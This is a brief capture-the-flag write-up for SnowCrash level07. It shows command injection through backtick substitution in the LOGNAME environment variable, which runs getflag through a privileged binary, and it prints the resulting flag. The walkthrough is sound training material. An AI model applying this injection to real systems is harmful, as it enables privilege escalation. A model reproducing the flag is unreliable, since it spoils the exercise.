# Step 1
A binary file named `level07` is present in the home directory of `level07`.
```bash
level07@SnowCrash:~$ ./level07
level07
```
this print `level07` and exits.

# Step 2
After some research, we can see that the binary print the content of the environment variable `LOGNAME`.

```bash
level07@SnowCrash:~$ export LOGNAME="test"
level07@SnowCrash:~$ ./level07
test
```

So we want to execute the command `getflag` by setting the `LOGNAME` environment variable to `getflag`.

To do this, we have to make a command substitution in the export command.

> see: <https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html>


```bash
export LOGNAME=\`getflag\`
./level07
```

### Result

flag07: `fiumuikeil55xe9cu4dood66h`

No password needed for `flag07` user.

